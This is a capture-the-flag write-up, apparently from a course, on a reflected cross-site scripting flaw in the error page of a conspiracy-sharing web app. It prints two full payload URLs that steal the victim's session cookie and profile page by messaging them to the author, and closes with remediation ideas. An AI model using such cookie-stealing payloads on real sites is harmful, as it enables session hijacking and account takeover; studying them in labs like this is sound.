Obxssession
==============

Overview
--------
Obxsession is a server side rendered web application which was made to share conspiracy theories. While anybody can view published theories only registered users can write and release such. Additionally registered users are able to send private messages to each other.

Vulnerability
-------------
When rendering its error page the application would take two url parameters, `error` and `p`, and inject them into the html document to describe the error. This opens up what we call cross-site scripting attacks because now we can construct links that contain malicious JavaScript code as values for those parameters. Now any user clicking on this link will be taken to the error page where this code will be executed.

Exploitation
------------
After creating a new user I clicked my way through all the presented links and checked the their html source to get a feeling for the application. First I wanted to see if a script sent as a private message will be executed when viewed on the messages page by sending a simple `<scirpt>alert(1)</script>` to myself which didn't work because the brackets would be html escaped. Then I remembered that weird error page with its url parameters and since I knew lavish was crazy about new theories and would therefore click on any link leading to a page on obxssession my best option was a reflected XSS attack. After playing around with the error page a little I found that I could basically execute any JavaScript code I wanted to as long as I html escaped the right characters. The first link I built sent a request to get the victims profile page and then send that as a private message back to me. It worked instantly but little did I know that it would have been a lot easier to just send me his cookie as a message... So I wasted some time because I didn't find the flag in regular text content of the page and started searching for it in the base64 encoded image because all the flags so far were written in 1337. Only when going a little mad during that fruitless search it occurred to me that I can just get his cookie with a similar link, set it in my browser through the JavaScript console and browse the page like I was him. I felt really dumb when I found the flag in picture but on the other side happy as well.  

Here are the two links that I sent to lavish.

    http://obxssession.wutctf.space/error?p=<script>var%20req=new%20XMLHttpRequest();req.open('GET','http://obxssession.wutctf.space/profile',false);req.send(null);var%20bodyText=req.responseText;req.open('POST','http://obxssession.wutctf.space/send');req.setRequestHeader("Set-Cookie",document.cookie);req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.send('receiver=10%26subject=exploit%26contents='%2BbodyText);</script>

    http://obxssession.wutctf.space/error?p=<script>var%20req=new%20XMLHttpRequest();req.open('POST','http://obxssession.wutctf.space/send');req.setRequestHeader("Set-Cookie",document.cookie);req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");req.send('receiver=10%26subject=exploit%26contents='%2Bdocument.cookie);</script>

Solution
--------
I see no reason that an error page takes url parameters to render the error message in the page. This is not information that has to be provided by the user, the server can figure this out by itself. Removing this way of rendering error pages should fix this vulnerability.  
But of course there remains the question what if we really need this way of rendering a page. One option would be Content Security Policy which would disable inline JavaScript but I heard in today's lecture that this can be circumvented as well.
